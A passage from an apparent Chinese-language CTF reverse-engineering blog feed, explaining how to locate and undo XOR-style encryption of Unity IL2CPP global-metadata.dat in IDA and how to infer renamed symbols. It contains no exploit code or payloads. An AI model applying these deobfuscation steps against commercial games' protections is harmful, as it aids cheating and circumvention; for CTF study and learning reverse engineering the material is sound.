<code>AES</code> 解密代码。</p><p><strong>IDA 分析流程：</strong></p><ol><li><p><strong>定位加载函数：</strong></p><ul><li><p>在 IDA 中打开 <code>GameAssembly.dll</code>。</p></li><li><p>搜索字符串 <code>&quot;global-metadata.dat&quot;</code>。</p></li><li><p>找到引用这个字符串的代码位置，通常就是加载函数。</p></li></ul></li><li><p><strong>分析修改：</strong></p><ul><li><p>正常代码通常是：<code>OpenFile</code> -&gt; <code>MapFile</code> -&gt; <code>Return</code>。</p></li><li><p>混淆代码通常是：<code>OpenFile</code> -&gt; <code>ReadFile</code> -&gt; <strong><code>Loop (XOR / Shift)</code></strong> -&gt; <code>Return</code>。</p></li><li><p>那个多出来的 <strong>Loop (循环)</strong> 就是解密算法。</p></li></ul></li><li><p><strong>还原：</strong></p><ul><li>看懂汇编逻辑（比如只是每个字节异或 <code>0x77</code>），自己写个 Python 脚本把文件跑一遍即可还原。</li></ul></li></ol><h4 id="策略三：结构体修复-针对“重命名”混淆"><a href="#策略三：结构体修复-针对“重命名”混淆" class="headerlink" title="策略三：结构体修复 (针对“重命名”混淆)"></a>策略三：结构体修复 (针对“重命名”混淆)</h4><p>有时候文件没加密，但 Il2CppDumper 出来的类名全是 <code>Class01</code>, <code>Method02</code>。这叫<strong>符号混淆 (Renaming)</strong>。</p><ul><li><p><strong>现象：</strong> Dumper 能工作，但出来的名字全是乱码或无意义字符。</p></li><li><p><strong>原因：</strong> 开发者在打包时（通常是 Unity 的 obfuscator 插件）就把原来的英文名替换掉了。</p></li><li><p><strong>对策：</strong></p><ul><li><p><strong>这种无法还原名字</strong>（因为原始名字已经被删了，就像 C++ 编译后一样）。</p></li><li><p><strong>只能靠猜：</strong></p><ul><li><p>看结构：继承自 <code>MonoBehaviour</code>，有 <code>Start</code>, <code>Update</code> 方法。</p></li><li><p>看字符串引用：如果在某个方法里引用了 <code>&quot;Not enough gold&quot;</code>，那这个方法大概率是 <code>BuyItem</code>。</p></li><li><p>这是最痛苦的逆向，需要结合游戏逻辑慢慢推导。</p></li></ul></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NET逆向处理：&quot;&gt;&lt;a href=&quot;#NET逆向处理：&quot; class=&quot;headerlink&quot; title=&quot;.NET逆向处理：&quot;&gt;&lt;/a&gt;.NET逆向处理：&lt;/h1&gt;&lt;p&gt;拿到exe文件，先拖进dnspy，不识别就拖进ida分析&lt;/p&gt;
&lt;p&gt;.NET编译可以</summary>
      
    
    
    
    <category term="REVERSE" scheme="http://example.com/categories/REVERSE/"/>
    
    <category term="ctf逆向中的misc" scheme="http://example.com/categories/REVERSE/ctf%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84misc/"/>
    
    
    <category term=".NET" scheme="http://example.com/tags/NET/"/>
    
  </entry>
  
</feed>
